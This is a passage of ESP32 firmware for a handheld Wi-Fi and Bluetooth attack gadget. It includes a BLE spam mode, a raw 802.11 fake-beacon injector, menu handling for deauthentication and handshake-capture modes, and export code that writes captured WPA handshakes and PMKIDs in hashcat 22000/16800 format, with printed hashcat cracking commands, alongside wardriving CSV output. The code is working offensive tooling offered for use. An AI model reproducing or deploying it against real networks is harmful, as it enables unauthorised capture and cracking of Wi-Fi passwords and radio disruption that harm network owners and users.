  Avatar::setGrassMoving(true); Avatar::setGrassSpeed(50);
  Avatar::setState(AvatarState::ANGRY);
  Display::showToast("PIGGY BLUES ON",2000);
}

void stop() {
  if(!_running) return;
  if(_adv&&_adv->isAdvertising()) _adv->stop();
  _running=false;
  Avatar::setGrassMoving(false); Avatar::setState(AvatarState::NEUTRAL);
  WiFi.mode(WIFI_STA); delay(200);
  NetworkRecon::start();
  Display::showToast("BLUES STOPPED",1500);
}

void update() {
  if(!_running) return;
  if(millis()-_lastBurst>180){ _burst(); _lastBurst=millis(); }
  static uint32_t lm=0;
  if(millis()-lm>3000){
    char buf[32]; snprintf(buf,sizeof(buf),"BLUES TX: %lu",_totalPkts);
    Mood::setStatusMessage(buf); lm=millis();
  }
}

bool isRunning() { return _running; }
uint32_t getPackets() { return _totalPkts; }

} // namespace PiggyBlues
#else
// ── STUB: NimBLE-Arduino not installed ──────────────────────
namespace PiggyBlues {
  static uint32_t _totalPkts = 0;
  bool _confirmWarning() { Display::showToast("INSTALL NimBLE-Arduino",3000); return false; }
  void start()  { Display::showToast("NimBLE NOT INSTALLED",3000); }
  void stop()   {}
  void update() {}
  bool isRunning()    { return false; }
  uint32_t getPackets(){ return 0; }
} // namespace PiggyBlues
#endif // NIMBLE_AVAILABLE

// ============================================================
// BACON MODE — fake beacon broadcaster
// Faithful port of src/modes/bacon.cpp
// Fingerprints nearby APs on start, then broadcasts beacon
// frames with vendor IE embedding those fingerprints.
// Tier 1/2/3 set TX rate (tap bottom zones to cycle).
// ============================================================
namespace BaconMode {

#define BACON_CHANNEL    6
#define BACON_MAX_APS    3
#define BACON_TIER1_MS   102   // ~100ms (one beacon interval)
#define BACON_TIER2_MS   500
#define BACON_TIER3_MS   2000
#define BACON_JITTER_MAX 20

// BaconAP is defined at global scope (before Display)
using ::BaconAP;

static bool     _running         = false;
static uint32_t _beaconCount     = 0;
static uint32_t _lastBeacon      = 0;
static uint32_t _sessionStart    = 0;
static uint16_t _seqNum          = 0;
static uint8_t  _tier            = 1;
static uint16_t _interval        = BACON_TIER1_MS;
static BaconAP  _aps[BACON_MAX_APS];
static uint8_t  _apCount         = 0;
static bool     _scanInProgress  = false;
static bool     _scanDone        = false;
static uint32_t _scanStart       = 0;
static bool     _reconWasRunning = false;

static const char* BACON_PHRASES[] = {
  "FATHER ONLINE. HOLD STEADY.",
  "WEYLAND NODE. SIGNAL CLEAN.",
  "PARENT SIGNAL. KEEP WATCH.",
  "COLD CORE. WARM CARRIER.",
  "AUTOMATON CALM. KEEP TX.",
  "NO WORRY. BYTE PIG.",
  "KOSHER OK. NO FLESH.",
  "HALAL OK. JUST SIGNAL."
};

// Build Vendor IE — OUI 50:52:4B (PRK), type 01 (Bacon)
// Embeds BSSID+RSSI+CH for each fingerprinted AP
static void _buildVendorIE(uint8_t* buf, size_t* len) {
  size_t off = 0;
  buf[off++] = 0xDD;  // Vendor Specific
  buf[off++] = 0;     // length placeholder
  buf[off++] = 0x50; buf[off++] = 0x52; buf[off++] = 0x4B;  // OUI PRK
  buf[off++] = 0x01;  // type: Bacon
  buf[off++] = _apCount;
  for (int i = 0; i < _apCount; i++) {
    memcpy(buf+off, _aps[i].bssid, 6); off += 6;
    buf[off++] = (uint8_t)_aps[i].rssi;
    buf[off++] = _aps[i].channel;
  }
  buf[1] = (uint8_t)(off - 2);
  *len = off;
}

static void _buildBeacon(uint8_t* buf, size_t* len) {
  size_t off = 0;
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_STA, mac);

  // 802.11 MAC header
  buf[off++]=0x80; buf[off++]=0x00;  // FC: beacon
  buf[off++]=0x00; buf[off++]=0x00;  // duration
  memset(buf+off,0xFF,6); off+=6;    // DA: broadcast
  memcpy(buf+off,mac,6);  off+=6;    // SA
  memcpy(buf+off,mac,6);  off+=6;    // BSSID
  uint16_t sc=(_seqNum++&0xFFF)<<4;
  buf[off++]=sc&0xFF; buf[off++]=(sc>>8)&0xFF;

  // Fixed fields
  memset(buf+off,0,8); off+=8;       // timestamp
  buf[off++]=0x64; buf[off++]=0x00;  // beacon interval 100TU
  buf[off++]=0x01; buf[off++]=0x04;  // capability: ESS + short preamble

  // SSID IE
  buf[off++]=0x00; buf[off++]=0x10;
  memcpy(buf+off,"USSID FATHERSHIP",16); off+=16;

  // Supported Rates IE
  buf[off++]=0x01; buf[off++]=0x08;
  buf[off++]=0x82; buf[off++]=0x84; buf[off++]=0x8B; buf[off++]=0x96;
  buf[off++]=0x0C; buf[off++]=0x12; buf[off++]=0x18; buf[off++]=0x24;

  // DS Parameter Set IE (channel)
  buf[off++]=0x03; buf[off++]=0x01; buf[off++]=BACON_CHANNEL;

  // Vendor IE with fingerprint
  if (_apCount > 0) {
    size_t vlen = 0;
    _buildVendorIE(buf+off, &vlen);
    off += vlen;
  }
  *len = off;
}

static void _startScan() {
  _apCount = 0; memset(_aps, 0, sizeof(_aps));
  _scanDone = false; _scanStart = millis(); _scanInProgress = true;
  WiFi.scanNetworks(true, true);
}

static void _processScan() {
  if (!_scanInProgress) return;
  if (millis()-_scanStart > 8000) { WiFi.scanDelete(); _scanInProgress=false; _scanDone=true; return; }
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return;
  if (n > 0) {
    // Pick top BACON_MAX_APS by RSSI
    for (int i = 0; i < n && _apCount < BACON_MAX_APS; i++) {
      int8_t best = -128; int bi = -1;
      for (int j = 0; j < n; j++) {
        bool used = false;
        uint8_t* b = WiFi.BSSID(j);
        for (int k=0;k<_apCount;k++) if(memcmp(_aps[k].bssid,b,6)==0){used=true;break;}
        if (!used && WiFi.RSSI(j) > best) { best=WiFi.RSSI(j); bi=j; }
      }
      if (bi >= 0) {
        memcpy(_aps[_apCount].bssid, WiFi.BSSID(bi), 6);
        strncpy(_aps[_apCount].ssid, WiFi.SSID(bi).c_str(), 32);
        _aps[_apCount].rssi    = WiFi.RSSI(bi);
        _aps[_apCount].channel = (uint8_t)WiFi.channel(bi);
        _apCount++;
      }
    }
    Serial.printf("[BACON] Fingerprinted %d APs\n", _apCount);
  }
  WiFi.scanDelete(); _scanInProgress=false; _scanDone=true;
  char buf[32]; snprintf(buf,sizeof(buf),"BACON HOT %d REFS CH:%d",_apCount,BACON_CHANNEL);
  Display::showToast(buf, 2500);
}

static void _setTier(uint8_t t) {
  _tier = t;
  _interval = (t==1) ? BACON_TIER1_MS : (t==2) ? BACON_TIER2_MS : BACON_TIER3_MS;
  char buf[32]; snprintf(buf,sizeof(buf),"TX TIER %d: %dMS",_tier,_interval);
  Display::showToast(buf, 1500);
}

void start() {
  if (_running) return;
  _reconWasRunning = NetworkRecon::isRunning();
  if (_reconWasRunning) NetworkRecon::pause();
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_channel(BACON_CHANNEL, WIFI_SECOND_CHAN_NONE);
  delay(100);
  _startScan();
  _running = true; _beaconCount = 0;
  _sessionStart = _lastBeacon = millis();
  _tier = 1; _interval = BACON_TIER1_MS; _seqNum = 0;
  Avatar::setState(AvatarState::HAPPY);
  Avatar::setGrassMoving(true); Avatar::setGrassSpeed(100);
  Display::showToast("BACON SIZZLING...", 2000);
  Serial.println("[BACON] started");
}

void stop() {
  if (!_running) return;
  _running = false;
  if (_scanInProgress) { WiFi.scanDelete(); _scanInProgress=false; }
  Avatar::setState(AvatarState::NEUTRAL);
  Avatar::setGrassMoving(false);
  if (_reconWasRunning) { NetworkRecon::resume(); _reconWasRunning=false; }
  else { NetworkRecon::start(); }
  Serial.printf("[BACON] stopped. sent=%lu\n", _beaconCount);
}

void update() {
  if (!_running) return;
  if (!_scanDone) { _processScan(); return; }
  uint32_t now = millis();
  uint32_t jitter = (uint32_t)random(0, BACON_JITTER_MAX+1);
  if (now - _lastBeacon >= (uint32_t)_interval + jitter) {
    uint8_t frame[256]; size_t flen=0;
    _buildBeacon(frame, &flen);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
    _beaconCount++;
    _lastBeacon = now;
  }
  // Status message rotation
  static uint32_t lastMsg=0;
  if (now-lastMsg > 5000) {
    char buf[48];
    if (random(0,3)==0) {
      snprintf(buf,sizeof(buf),"CH%d T%d %dMS TX:%lu",BACON_CHANNEL,_tier,_interval,_beaconCount);
    } else {
      strncpy(buf, BACON_PHRASES[random(0, 8)], sizeof(buf)-1);
    }
    Mood::setStatusMessage(buf);
    lastMsg = now;
  }
}

bool isRunning()         { return _running; }
uint32_t getBeaconCount(){ return _beaconCount; }
uint8_t  getTier()       { return _tier; }
uint16_t getInterval()   { return _interval; }
uint8_t  getAPCount()    { return _apCount; }
const BaconAP* getAPs()  { return _aps; }

// Called from touch handler to cycle tier (tap bottom zones)
void cycleTier() { _setTier((_tier % 3) + 1); }
void setTier(uint8_t t) { if(t>=1&&t<=3) _setTier(t); }

float getBeaconRate() {
  if (!_running) return 0.0f;
  uint32_t s = (millis()-_sessionStart)/1000;
  return s ? (float)_beaconCount/s : 0.0f;
}

} // namespace BaconMode


void startScan() {
  // Only do a passive scan when no active mode is running promiscuous
  if (currentMode==PorkchopMode::OINK_MODE   ||
      currentMode==PorkchopMode::DNH_MODE    ||
      currentMode==PorkchopMode::WARHOG_MODE ||
      currentMode==PorkchopMode::PIGGYBLUES_MODE) return;
  if (scanInProgress) return;
  WiFi.scanNetworks(/*async=*/true);
  scanInProgress = true;
  lastScanTime = millis();
}

void checkScan() {
  if (!scanInProgress) return;
  int n = WiFi.scanComplete();
  if (n==WIFI_SCAN_RUNNING) return;
  scanInProgress = false;
  if (n<=0){ WiFi.scanDelete(); return; }
  netTotal=0;
  for(int i=0;i<n&&netTotal<MAX_NETS;i++){
    strncpy(nets[netTotal].ssid,WiFi.SSID(i).c_str(),32); nets[netTotal].ssid[32]=0;
    nets[netTotal].rssi    = WiFi.RSSI(i);
    nets[netTotal].channel = (uint8_t)WiFi.channel(i);
    nets[netTotal].authmode= (uint8_t)WiFi.encryptionType(i);
    netTotal++;
  }
  networkCount=netTotal;
  WiFi.scanDelete();
  Serial.printf("[SCAN] %d nets\n",netTotal);
}

// ============================================================
// MODE TRANSITIONS — start/stop active subsystems cleanly
// ============================================================
void enterMode(PorkchopMode m) {
  // Stop current active mode first
  switch(currentMode){
    case PorkchopMode::OINK_MODE:       OinkMode::stop(); break;
    case PorkchopMode::DNH_MODE:        DNHMode::stop(); break;
    case PorkchopMode::WARHOG_MODE:     WarhogMode::stop(); SpiffsSave::saveWigleCSV(); break;
    case PorkchopMode::PIGGYBLUES_MODE: PiggyBlues::stop(); break;
    case PorkchopMode::BACON_MODE:      BaconMode::stop(); break;
    case PorkchopMode::BOAR_BROS:       if(PigSync::isRunning()) PigSync::stop(); break;
    default: break;
  }
  currentMode=m;
  // Start new mode
  switch(m){
    case PorkchopMode::OINK_MODE:       OinkMode::start(); break;
    case PorkchopMode::DNH_MODE:        DNHMode::start(); break;
    case PorkchopMode::WARHOG_MODE:     WarhogMode::start(); break;
    case PorkchopMode::PIGGYBLUES_MODE: PiggyBlues::start(); break;
    case PorkchopMode::BACON_MODE:      BaconMode::start(); break;
    case PorkchopMode::BOAR_BROS:       break; // PigSync started on first tap
    case PorkchopMode::SPECTRUM_MODE:   specEnterMs = millis(); if(!NetworkRecon::isRunning()) NetworkRecon::start(); break;
    default:
      // Ensure NetworkRecon is running in idle/menu states
      if(!NetworkRecon::isRunning()) NetworkRecon::start();
      NetworkRecon::setPacketCallback(nullptr);
      break;
  }
}

// ============================================================
// INPUT HANDLER (touch-based navigation)
// ============================================================
void handleInput() {
  int tx, ty;
  uint8_t touchEvent = Touch::update(tx, ty);
  if (touchEvent==0) return;
  bool isTap=(touchEvent==1), isHold=(touchEvent==2);
  uint32_t holdMs = isHold ? (millis() - Touch::touchStart) : 0;

  switch (currentMode) {
    case PorkchopMode::IDLE:
      if(isTap)  { currentMode=PorkchopMode::MENU; menuScroll=0; menuSel=0; Mood::onIdle(); }
      else if(isHold) {
        cfg.themeIndex=(cfg.themeIndex+1)%THEME_COUNT;
        char buf[32]; snprintf(buf,sizeof(buf),"THEME: %s",THEMES[cfg.themeIndex].name);
        Display::showToast(buf,1500);
      }
      break;

    case PorkchopMode::MENU: {
      static const int _MCOUNT = 15;
      if (isTap) {
        // Top-left corner (x < 60, y < TOP_BAR_H+40) = back to IDLE
        if (tx < 60 && ty < TOP_BAR_H + 40) {
          currentMode = PorkchopMode::IDLE;
          menuScroll = 0; menuSel = 0;
          break;
        }
        // Zone-based navigation relative to sprite area
        int relY = ty - TOP_BAR_H;
        int zone = (relY < MAIN_H / 3) ? 0 :    // top third  = up
                   (relY > MAIN_H * 2 / 3) ? 2   // bot third  = down
                                            : 1;  // mid third  = select
        if (zone == 0) {
          // Scroll up
          if (menuSel > 0) menuSel--;
        } else if (zone == 2) {
          // Scroll down
          if (menuSel < _MCOUNT - 1) menuSel++;
        } else {
          // Select current item
          switch(menuSel) {
            case  0: enterMode(PorkchopMode::OINK_MODE); break;
            case  1: enterMode(PorkchopMode::DNH_MODE);  break;
            case  2: enterMode(PorkchopMode::WARHOG_MODE); break;
            case  3: enterMode(PorkchopMode::PIGGYBLUES_MODE); break;
            case  4: enterMode(PorkchopMode::BACON_MODE); break;
            case  5: enterMode(PorkchopMode::SPECTRUM_MODE); currentMode=PorkchopMode::SPECTRUM_MODE; break;
            case  6: currentMode=PorkchopMode::SETTINGS; break;
            case  7: currentMode=PorkchopMode::ABOUT; break;
            case  8: currentMode=PorkchopMode::CAPTURES; break;
            case  9: currentMode=PorkchopMode::SWINE_STATS; break;
            case 10: currentMode=PorkchopMode::BOUNTY_STATUS; break;
            case 11: enterMode(PorkchopMode::BOAR_BROS); break;
            case 12: currentMode=PorkchopMode::UNLOCKABLES; break;
            case 13: currentMode=PorkchopMode::DIAGNOSTICS; HeapHealth::setKnuthEnabled(true); break;
            default: currentMode=PorkchopMode::IDLE; break;
          }
        }
      } else if (isHold) {
        currentMode = PorkchopMode::IDLE;
        menuScroll = 0; menuSel = 0;
      }
      break;
    }

    case PorkchopMode::SETTINGS:
      if(isTap){ cfg.themeIndex=(cfg.themeIndex+1)%THEME_COUNT; }
      else if(isHold){
        prefs.begin("pork",false);
        prefs.putUChar("theme",cfg.themeIndex);
        prefs.putUChar("bright",cfg.brightness);
        prefs.end(); XP::save();
        Display::showToast("SAVED!",1500);
        currentMode=PorkchopMode::IDLE;
      }
      break;

    case PorkchopMode::ABOUT:
      if(isTap)  { Display::aboutQuoteIdx++;
        static uint8_t _aboutTaps = 0;
        if(++_aboutTaps >= 5) XP::unlockAchievement((PorkAchievement)(1ULL<<47)); }
      else if(isHold) { currentMode=PorkchopMode::IDLE; }
      break;

    case PorkchopMode::CAPTURES:
      if (isTap) {
        if (tx > DISPLAY_W/2) {
          capShowChallengesFlag = !capShowChallengesFlag;  // toggle loot/challenges
        } else {
          currentMode = PorkchopMode::IDLE;
          capShowChallengesFlag = false;
        }
      }
      if (isHold) {
        if (holdMs > 1500) {
          Display::showToast("DUMPING...", 2000);
          SerialDump::dumpAll(gpsLat, gpsLon);
          SpiffsSave::saveWigleCSV();
          SpiffsSave::saveAll();
          Display::showToast("DUMP COMPLETE", 2000);
        } else {
          currentMode = PorkchopMode::IDLE;
          capShowChallengesFlag = false;
        }
      }
      break;

    case PorkchopMode::ACHIEVEMENTS: {
      if (isTap) {
        if (achDetailShow) {
          achDetailShow = false;
        } else if (tx < DISPLAY_W/3) {
          if (achScroll > 0) { achScroll--; achDetailIdx = achScroll; }
        } else if (tx > DISPLAY_W*2/3) {
          if (achScroll + 11 < ACH_COUNT) { achScroll++; achDetailIdx = achScroll; }
        } else {
          // Centre tap: show detail for currently selected row
          achDetailIdx = achScroll;
          achDetailShow = true;
        }
      }
      if (isHold) { achDetailShow = false; currentMode = PorkchopMode::IDLE; }
      break;
    }

    case PorkchopMode::SWINE_STATS: {
      if (isTap) {
        if (tx < DISPLAY_W/3)        swineTab = (swineTab + 2) % 3;
        else if (tx > DISPLAY_W*2/3) swineTab = (swineTab + 1) % 3;
      }
      if (isHold) currentMode = PorkchopMode::IDLE;
      break;
    }

    case PorkchopMode::BOUNTY_STATUS:
      // Tap = refresh (re-render), Hold = back to IDLE
      if (isHold) currentMode = PorkchopMode::IDLE;
      // Tap does nothing extra — display redraws every loop naturally
      break;

    case PorkchopMode::DIAGNOSTICS:
      if (isHold) {
        HeapHealth::setKnuthEnabled(false);
        currentMode = PorkchopMode::IDLE;
      } else if (isTap) {
        // Tap toggles WebUI soft AP
        if (WebUI::isActive()) WebUI::stop();
        else WebUI::start();
      }
      break;

    case PorkchopMode::UNLOCKABLES:
      if (isHold) {
        currentMode = PorkchopMode::IDLE;
      } else if (isTap) {
        // Determine row tapped (4 items starting y=28, height 34 each)
        int row = (ty - TOP_BAR_H - 28) / 34;
        if (row >= 0 && row < 4) {
          bool got = XP::getUnlockables() & (1UL<<row);
          if (got) {
            Display::showToast("ALREADY YOURS", 1500);
          } else {
            const char* names[] = {"PROPHECY","1MM0RT4L","C4LLS1GN","B4K3D_P1G"};
            Serial.printf("[UNLOCKABLES] Phrase entry for %s\n", names[row]);
            Display::showToast("TYPE IN SERIAL MONITOR", 2000);
          }
        }
      }
      break;

    case PorkchopMode::BOAR_BROS:
      if (isHold) {
        enterMode(PorkchopMode::IDLE);
      } else if (isTap) {
        if (!PigSync::isRunning()) {
          // Start PigSync on first tap
          PigSync::start();
        } else if (PigSync::getDeviceCount() > 0 && !PigSync::isConnected() && !PigSync::isSyncing()) {
          // Tap = connect to selected device
          PigSync::connectTo(PigSync::getSelectedIdx());
        } else if (PigSync::isSyncComplete()) {
          // Tap after complete = back to IDLE
          enterMode(PorkchopMode::IDLE);
        }
      }
      break;

    case PorkchopMode::OINK_MODE:
    case PorkchopMode::DNH_MODE:
    case PorkchopMode::WARHOG_MODE:
    case PorkchopMode::PIGGYBLUES_MODE:
    case PorkchopMode::SPECTRUM_MODE:
      if(isHold){
        enterMode(PorkchopMode::IDLE);
        Display::showToast("STOPPED",1200);
      } else if(isTap){
        // Top-right corner → captures
        if(tx>DISPLAY_W*3/4 && ty<TOP_BAR_H+MAIN_H/3){
          currentMode=PorkchopMode::CAPTURES;
        } else if(tx>DISPLAY_W*3/4 && ty>DISPLAY_H-BOTTOM_BAR_H-40){
          currentMode=PorkchopMode::ACHIEVEMENTS;
        } else if(currentMode==PorkchopMode::OINK_MODE &&
                  tx<DISPLAY_W/3 && ty<TOP_BAR_H+50 &&
                  OinkMode::getTargetSSID() && OinkMode::getTargetSSID()[0]) {
          // TAP top-left on attacking SSID = add to BOAR BROS exclusion list
          if (OinkMode::addCurrentTargetToBoarBros()) {
            char buf[40]; snprintf(buf,sizeof(buf),"BOAR BRO: %s", OinkMode::getLastPwnedSSID()[0]?OinkMode::getLastPwnedSSID():"added");
            Display::showToast(buf, 2000);
          } else {
            Display::showToast("ALREADY A BRO", 1500);
          }
        } else {
          startScan();
          Display::showToast("SCANNING...",1000);
        }
      }
      break;

    case PorkchopMode::BACON_MODE:
      if(isHold){
        enterMode(PorkchopMode::IDLE);
        Display::showToast("BACON OFF",1200);
      } else if(isTap){
        // Three tap zones = three tiers
        if(tx < DISPLAY_W/3)       BaconMode::setTier(1);
        else if(tx < DISPLAY_W*2/3) BaconMode::setTier(2);
        else                         BaconMode::setTier(3);
      }
      break;

    default:
      if(isTap||isHold) currentMode=PorkchopMode::IDLE;
      break;
  }
}

// ============================================================
// CONFIG LOAD/SAVE
// ============================================================
void loadConfig() {
  prefs.begin("pork",true);
  cfg.themeIndex = prefs.getUChar("theme",0);
  cfg.brightness = prefs.getUChar("bright",80);
  prefs.getString("callsign",cfg.callsign,sizeof(cfg.callsign));
  prefs.getString("name",cfg.pigName,sizeof(cfg.pigName));
  prefs.end();
  if(cfg.themeIndex>=THEME_COUNT) cfg.themeIndex=0;
  if(cfg.brightness<10)  cfg.brightness=10;
  if(cfg.brightness>100) cfg.brightness=100;
}

// ============================================================
// SERIAL DUMP — output captures over USB since SD is disabled
// Formats:
//   hashcat 22000  — for WPA handshakes (hcxtools compatible)
//   hashcat 16800  — for PMKID-only captures
//   WiGLE CSV      — for wardriving data
//   PCAP hex       — raw 802.11 frames as hex for Wireshark import
// Trigger: HOLD on CAPTURES screen (>1.5s hold)
// ============================================================
namespace SerialDump {

// Print hex bytes inline, no spaces
static void _hex(const uint8_t* b, uint8_t len) {
  for (uint8_t i=0; i<len; i++) {
    if (b[i]<0x10) Serial.print('0');
    Serial.print(b[i], HEX);
  }
}

// MAC as XX:XX:XX:XX:XX:XX
static void _mac(const uint8_t* b) {
  for (uint8_t i=0; i<6; i++) {
    if (b[i]<0x10) Serial.print('0');
    Serial.print(b[i], HEX);
    if (i<5) Serial.print(':');
  }
}

// Dump all OinkMode handshakes in hashcat 22000 format
// Format: WPA*02*MIC*AP_MAC*STA_MAC*ESSID_HEX*ANONCE*EAPOL*MESSAGEPAIR
static void dumpHandshakes22000() {
  const auto& hs = OinkMode::getHandshakes();
  if (hs.empty()) {
    Serial.println("# No handshakes captured");
    return;
  }
  Serial.println("# === HASHCAT 22000 FORMAT ===");
  Serial.println("# Copy lines below to file.hc22000 and run:");
  Serial.println("# hashcat -m 22000 file.hc22000 wordlist.txt");
  Serial.println();

  for (const auto& h : hs) {
    if (!h.hasValidPair()) continue;

    // Determine which pair to use: prefer M1+M2, fallback M2+M3
    uint8_t mi1 = h.hasM1() ? 0 : 1;  // M1 or M2
    uint8_t mi2 = h.hasM2() ? 1 : 2;  // M2 or M3
    uint8_t msgPair = h.getMessagePair();

    const EAPOLFrame& eapol = h.frames[mi2];  // MIC is in M2 or M3
    const EAPOLFrame& anonce_frame = h.frames[mi1]; // ANonce in M1 or M2

    if (eapol.len < 99) continue;  // Too short for MIC+ANonce

    // Extract MIC (offset 81 in EAPOL-Key payload)
    const uint8_t* mic    = eapol.data + 81;
    // Extract ANonce (offset 17 in EAPOL-Key payload)
    const uint8_t* anonce = anonce_frame.data + 17;
    // ESSID as hex
    uint8_t essidLen = (uint8_t)strlen(h.ssid);

    // WPA*02*<MIC>*<AP_MAC>*<STA_MAC>*<ESSID_HEX>*<ANONCE>*<EAPOL_HEX>*<MSGPAIR>
    Serial.print("WPA*02*");
    _hex(mic, 16);
    Serial.print('*');
    _hex(h.bssid, 6);
    Serial.print('*');
    _hex(h.station, 6);
    Serial.print('*');
    for (uint8_t i=0; i<essidLen; i++) {
      if ((uint8_t)h.ssid[i]<0x10) Serial.print('0');
      Serial.print((uint8_t)h.ssid[i], HEX);
    }
    Serial.print('*');
    _hex(anonce, 32);
    Serial.print('*');
    _hex(eapol.data, eapol.len);
    Serial.print('*');
    Serial.print(msgPair, HEX);
    Serial.println();
  }
  Serial.println();
}

// Dump all PMKID captures in hashcat 16800 format
// Format: PMKID*AP_MAC*STA_MAC*ESSID_HEX
static void dumpPMKIDs16800() {
  const auto& pmkids = OinkMode::getPMKIDs();
  if (pmkids.empty()) {
    Serial.println("# No PMKIDs captured");
    return;
  }
  Serial.println("# === HASHCAT 16800 FORMAT (PMKID) ===");
  Serial.println("# Copy lines below to file.hc16800 and run:");
  Serial.println("# hashcat -m 16800 file.hc16800 wordlist.txt");
  Serial.println();

  for (const auto& p : pmkids) {
    uint8_t essidLen = (uint8_t)strlen(p.ssid);
    _hex(p.pmkid, 16);
    Serial.print('*');
    _hex(p.bssid, 6);
    Serial.print('*');
    _hex(p.station, 6);
    Serial.print('*');
    for (uint8_t i=0; i<essidLen; i++) {
      if ((uint8_t)p.ssid[i]<0x10) Serial.print('0');
      Serial.print((uint8_t)p.ssid[i], HEX);
    }
    Serial.println();
  }
  Serial.println();
}

// Dump wardriving data as WiGLE CSV
// Header: WigleWifi-1.4,appRelease=PorkChopCYD,...
// Fields: MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,Latitude,Longitude,AltitudeMSL,Accuracy,Type
static void dumpWiGLECSV(float lat, float lon) {
  Serial.println("# === WIGLE CSV FORMAT ===");
  Serial.println("# Upload to wigle.net or import to WiGLE app");
  Serial.println();
  Serial.println("WigleWifi-1.4,appRelease=PorkChopCYD,model=ESP32-CYD,release=1.0,device=PorkChopCYD,display=yes,board=esp32,brand=Espressif");
  Serial.println("MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMSL,Accuracy,Type");

  NetworkRecon::enterCritical();
  const auto& nets = NetworkRecon::getNetworks();
  for (const auto& n : nets) {
    // MAC
    _mac(n.bssid);
    Serial.print(',');
    // SSID (escape commas)
    for (uint8_t i=0; i<strlen(n.ssid); i++) {
      if (n.ssid[i]==',') Serial.print(' ');
      else Serial.print(n.ssid[i]);
    }
    Serial.print(',');
    // AuthMode
    switch(n.authmode) {
      case WIFI_AUTH_OPEN:         Serial.print("[OPEN]"); break;
      case WIFI_AUTH_WEP:          Serial.print("[WEP]"); break;
      case WIFI_AUTH_WPA_PSK:      Serial.print("[WPA][PSK]"); break;
      case WIFI_AUTH_WPA2_PSK:     Serial.print("[WPA2][PSK]"); break;
      case WIFI_AUTH_WPA_WPA2_PSK: Serial.print("[WPA][WPA2][PSK]"); break;
      case WIFI_AUTH_WPA3_PSK:     Serial.print("[WPA3][SAE]"); break;
      default:                     Serial.print("[WPA2][PSK]"); break;
    }
    Serial.print(',');
    // FirstSeen (fake ISO timestamp — no RTC on CYD)
    Serial.print("2024-01-01 00:00:00,");
    // Channel
    Serial.print(n.channel);
    Serial.print(',');
    // RSSI
    Serial.print(n.rssiAvg ? n.rssiAvg : n.rssi);
    Serial.print(',');
    // Lat/Lon (from GPS if available)
    if (lat != 0.0f) {
      Serial.print(lat, 6); Serial.print(',');
      Serial.print(lon, 6);
    } else {
      Serial.print("0.000000,0.000000");
    }
    Serial.println(",0,0,WIFI");
  }
  NetworkRecon::exitCritical();
  Serial.println();
}

// Summary header for serial terminal
static void dumpHeader() {
  Serial.println();
  Serial.println("========================================");
  Serial.println("  PORKCHOP CYD — CAPTURE DUMP");
  Serial.printf ("  Heap: %u free / %u largest\n",
    ESP.getFreeHeap(), heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
  Serial.printf ("  Networks seen: %d\n", NetworkRecon::getNetworkCount());
  Serial.printf ("  Handshakes: %d  PMKIDs: %d  Deauths: %lu\n",
    OinkMode::getHandshakeCount(), OinkMode::getPMKIDCount(), OinkMode::getDeauthCount());
  Serial.printf ("  DNH passive HS: %d\n", DNHMode::getHSCount());
  Serial.printf ("  Warhog APs logged: %lu\n", WarhogMode::getTotalNets());
  Serial.println("========================================");
  Serial.println();
}

// Master dump — call all sections
void dumpAll(float lat, float lon) {
  dumpHeader();
  dumpHandshakes22000();
  dumpPMKIDs16800();
  dumpWiGLECSV(lat, lon);
  Serial.println("# === END OF DUMP ===");
  Serial.println();
}

} // namespace SerialDump

// ============================================================
// SPIFFS PERSISTENCE — save/load captures across reboots
// Since SD is disabled, use SPIFFS (1MB partition).
// Files: /hs.bin   — CapturedHandshake array (up to 20)
//        /pmkid.bin — CapturedPMKID array (up to 20)
// Format: uint8_t count, then packed structs (no pointers).
// Call SpiffsSave::saveAll() after each new capture.
// Call SpiffsSave::loadAll() once in setup().
// ============================================================
namespace SpiffsSave {

#define SPIFFS_HS_PATH    "/hs.bin"
#define SPIFFS_PMKID_PATH "/pmkid.bin"
#define SPIFFS_MAX_SAVES  20
#define SD_CAPTURES_DIR   "/porkchop/captures"
static bool _mounted = false;

bool mount() {
  if (_mounted) return true;
  if (!SPIFFS.begin(true)) {
    Serial.println("[SPIFFS] mount failed");
    return false;
  }
  _mounted = true;
  Serial.printf("[SPIFFS] mounted, free=%u used=%u\n",
    SPIFFS.totalBytes()-SPIFFS.usedBytes(), SPIFFS.usedBytes());
  return true;
}

// Write a single handshake to SD as hashcat 22000 format
static void _sdSaveHS(const CapturedHandshake& hs) {
  if (!sdAvailable) return;
  if (!hs.hasValidPair()) return;
  if (!SD.exists(SD_CAPTURES_DIR)) SD.mkdir(SD_CAPTURES_DIR);
  char fname[96], bssidStr[18];
  snprintf(bssidStr,sizeof(bssidStr),"%02x%02x%02x%02x%02x%02x",
    hs.bssid[0],hs.bssid[1],hs.bssid[2],hs.bssid[3],hs.bssid[4],hs.bssid[5]);
  snprintf(fname,sizeof(fname),"%s/%.20s_%s.22000",SD_CAPTURES_DIR,hs.ssid,bssidStr);
  File f = SD.open(fname, FILE_APPEND);
  if (!f) { Serial.println("[SD] hs write failed"); return; }
  // Use same frame extraction as SerialDump
  uint8_t mi1 = hs.hasM1() ? 0 : 1;
  uint8_t mi2 = hs.hasM2() ? 1 : 2;
  uint8_t msgPair = hs.getMessagePair();
  const EAPOLFrame& eapol        = hs.frames[mi2];
  const EAPOLFrame& anonce_frame = hs.frames[mi1];
  if (eapol.len < 99) { f.close(); return; }
  const uint8_t* mic    = eapol.data + 81;
  const uint8_t* anonce = anonce_frame.data + 17;
  uint8_t essidLen = (uint8_t)strlen(hs.ssid);
  // WPA*02*MIC*APMAC*STAMAC*ESSID_HEX*ANONCE*EAPOL_HEX*MSGPAIR
  f.print("WPA*02*");
  for(int i=0;i<16;i++){char h[3];snprintf(h,3,"%02x",mic[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<6;i++){char h[3];snprintf(h,3,"%02x",hs.bssid[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<6;i++){char h[3];snprintf(h,3,"%02x",hs.station[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<essidLen;i++){char h[3];snprintf(h,3,"%02x",(uint8_t)hs.ssid[i]);f.print(h);}
  f.print('*');
  for(int i=0;i<32;i++){char h[3];snprintf(h,3,"%02x",anonce[i]);f.print(h);}
  f.print('*');
